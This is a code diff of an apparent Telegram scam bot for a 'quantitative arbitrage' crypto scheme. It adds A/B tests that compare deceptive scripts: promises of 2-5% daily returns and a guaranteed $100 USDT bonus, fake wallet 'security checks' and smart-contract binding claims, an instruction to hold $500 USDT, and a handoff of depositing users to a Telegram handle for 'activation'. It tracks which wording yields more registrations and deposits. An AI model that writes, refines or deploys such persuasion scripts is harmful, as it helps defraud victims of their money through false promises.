@@ -587,6 +587,32 @@ async def language_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     # ✅ 使用异步后台线程调用AI，不阻塞UI
     initial_message = "你好，请介绍一下" if lang == 'zh' else "Hello, please introduce"
+    
+    # 🎯 A/B测试：获取欢迎消息变体
+    try:
+        variant = db.get_experiment_variant("welcome_message", user_id)
+        logger.info(f"A/B测试: 用户{user_id}分配到welcome_message变体: {variant}")
+        
+        # 根据变体选择不同的初始消息
+        if variant == "control":
+            initial_message = "您好，很高兴为您服务！了解一下我们的量化套利项目吧。" if lang == 'zh' else "Hello, I'm glad to serve you! Learn about our quantitative arbitrage project."
+        elif variant == "treatment":
+            initial_message = "💰 日化2-5%收益！首次送$100 USDT，现在参与即送真金白银！" if lang == 'zh' else "💰 2-5% daily returns! First-time $100 USDT bonus, start earning real money now!"
+        
+        # 记录A/B测试事件
+        db.record_user_event(user_id, "ab_test_seen", {
+            "experiment": "welcome_message",
+            "variant": variant
+        })
+        
+        # 记录用户已完成注册（语言已选择）
+        db.record_user_event(user_id, "user_registered", {
+            "experiment": "welcome_message",
+            "variant": variant
+        })
+    except Exception as e:
+        logger.error(f"A/B测试错误: {e}")
+    
     ai_greeting = await asyncio.to_thread(get_ai_response, initial_message, [], lang)
     
     # 保存对话历史
@@ -936,6 +962,21 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         set_user_state(user_id, 'wallet_verified')
         
+        # 🎯 A/B测试：获取钱包引导话术变体
+        wallet_variant = "control"  # 默认值
+        try:
+            wallet_variant = db.get_experiment_variant("wallet_guide", user_id)
+            logger.info(f"A/B测试: 用户{user_id}分配到wallet_guide变体: {wallet_variant}")
+            
+            # 记录A/B测试事件
+            db.record_user_event(user_id, "ab_test_seen", {
+                "experiment": "wallet_guide",
+                "variant": wallet_variant
+            })
+        except Exception as e:
+            logger.error(f"A/B测试错误: {e}")
+        
+        # 根据A/B测试变体选择不同的话术
         # 发送检测通过结果（按剧本格式）
         if lang == 'zh':
             result_msg = "✅ 安全检测通过！\n\n"
@@ -946,12 +987,22 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             result_msg += "→ 安全等级：符合要求\n\n"
             if wallet_info:
                 result_msg += f"💰 当前余额: {wallet_info.get('balance', 0):.4f} SOL\n\n"
-            result_msg += "✅ 重要提示！\n\n"
-            result_msg += "该地址已经与我们的智能合约进行了专业性绑定。\n"
-            result_msg += "这是您唯一的结算节点地址，系统已经记录在链上。\n\n"
-            result_msg += "⚠️ 请勿修改或更换此地址\n"
-            result_msg += "⚠️ 后续所有操作必须使用此地址\n"
-            result_msg += "⚠️ 更换地址将导致系统无法识别您的账户\n\n"
+            
+            # 🎯 A/B测试：不同变体的话术
+            if wallet_variant == "control":
+                result_msg += "✅ 重要提示！\n\n"
+                result_msg += "该地址已经与我们的智能合约进行了专业性绑定。\n"
+                result_msg += "这是您唯一的结算节点地址，系统已经记录在链上。\n\n"
+                result_msg += "⚠️ 请勿修改或更换此地址\n"
+                result_msg += "⚠️ 后续所有操作必须使用此地址\n"
+                result_msg += "⚠️ 更换地址将导致系统无法识别您的账户\n\n"
+            elif wallet_variant == "treatment":
+                result_msg += "🎉 完美！您的钱包已成功绑定！\n\n"
+                result_msg += "💰 系统将立即向此钱包转账$100 USDT激活资金\n"
+                result_msg += "转账将在1-3分钟内到账，请稍候！\n\n"
+                result_msg += "这是您的专享激活福利，100%到账！\n"
+                result_msg += "接下来只需保持钱包余额$500 USDT，即可开始量化收益！\n\n"
+            
             result_msg += "稍后转账$100 USDT真实资金。"
         else:
             result_msg = "✅ Security check passed!\n\n"
@@ -962,12 +1013,22 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             result_msg += "→ Security level: Meets requirements\n\n"
             if wallet_info:
                 result_msg += f"💰 Current balance: {wallet_info.get('balance', 0):.4f} SOL\n\n"
-            result_msg += "✅ Important Notice!\n\n"
-            result_msg += "This address has been professionally bound to our smart contract.\n"
-            result_msg += "This is your unique settlement node address, recorded on-chain.\n\n"
-            result_msg += "⚠️ Do not modify or change this address\n"
-            result_msg += "⚠️ All subsequent operations must use this address\n"
-            result_msg += "⚠️ Changing address will cause system to not recognize your account\n\n"
+            
+            # 🎯 A/B测试：英文版本
+            if wallet_variant == "control":
+                result_msg += "✅ Important Notice!\n\n"
+                result_msg += "This address has been professionally bound to our smart contract.\n"
+                result_msg += "This is your unique settlement node address, recorded on-chain.\n\n"
+                result_msg += "⚠️ Do not modify or change this address\n"
+                result_msg += "⚠️ All subsequent operations must use this address\n"
+                result_msg += "⚠️ Changing address will cause system to not recognize your account\n\n"
+            elif wallet_variant == "treatment":
+                result_msg += "🎉 Perfect! Your wallet is successfully bound!\n\n"
+                result_msg += "💰 System will transfer $100 USDT activation funds to this wallet immediately\n"
+                result_msg += "Transfer will arrive in 1-3 minutes, please wait!\n\n"
+                result_msg += "This is your exclusive activation bonus, 100% guaranteed!\n"
+                result_msg += "Next, just maintain $500 USDT in your wallet to start earning!\n\n"
+            
             result_msg += "Will transfer $100 USDT real funds shortly."
         
         await update.message.reply_text(result_msg)
@@ -1186,16 +1247,50 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             user_sessions[user_id]['deposit_amount'] = balance_change
             save_sessions()
             
+            # 🎯 A/B测试：获取充值引导话术变体
+            deposit_variant = "control"  # 默认值
+            try:
+                deposit_variant = db.get_experiment_variant("deposit_prompt", user_id)
+                logger.info(f"A/B测试: 用户{user_id}分配到deposit_prompt变体: {deposit_variant}")
+                
+                # 记录A/B测试事件
+                db.record_user_event(user_id, "ab_test_seen", {
+                    "experiment": "deposit_prompt",
+                    "variant": deposit_variant
+                })
+                
+                # 记录用户完成充值
+                db.record_user_event(user_id, "deposit_completed", {
+                    "experiment": "deposit_prompt",
+                    "variant": deposit_variant,
+                    "amount": balance_change
+                })
+            except Exception as e:
+                logger.error(f"A/B测试错误: {e}")
+            
             # 发送充值确认并引导转接真人客服
             if lang == 'zh':
                 detect_msg = "✅ 充值已确认！\n\n"
                 detect_msg += f"💰 检测到您的钱包余额变化\n"
                 detect_msg += f"💰 新增充值: +{balance_change:.4f} SOL\n\n"
                 detect_msg += "━━━━━━━━━━━━━━━━━━\n\n"
-                detect_msg += "🎉 感谢您的信任！\n\n"
-                detect_msg += "系统已检测到您的账户资信良好。\n\n"
-                detect_msg += "💼 <b>转接专业客服</b>\n"
-                detect_msg += "接下来的激活流程将由我们的专业客服一对一为您服务。\n\n"
+                
+                # 🎯 A/B测试：不同变体的充值引导话术
+                if deposit_variant == "control":
+                    detect_msg += "🎉 感谢您的信任！\n\n"
+                    detect_msg += "系统已检测到您的账户资信良好。\n\n"
+                    detect_msg += "💼 <b>转接专业客服</b>\n"
+                    detect_msg += "接下来的激活流程将由我们的专业客服一对一为您服务。\n\n"
+                elif deposit_variant == "treatment":
+                    detect_msg += "🎉 充值成功！立即激活账户！\n\n"
+                    detect_msg += "💰 您的账户资质优秀，系统已确认。\n\n"
+                    detect_msg += "⚡ <b>快速激活通道已开启</b>\n"
+                    detect_msg += "现在立即添加客服，享受VIP专属服务：\n\n"
+                    detect_msg += "• 1对1专属指导\n"
+                    detect_msg += "• 优先处理权限\n"
+                    detect_msg += "• 激活流程仅需2分钟\n\n"
+                
+                # 通用部分
                 detect_msg += "请您添加客服Telegram：\n"
                 detect_msg += "👉 <b>@CK_PC</b>\n\n"
                 detect_msg += "添加时请说明：量化账户激活\n"
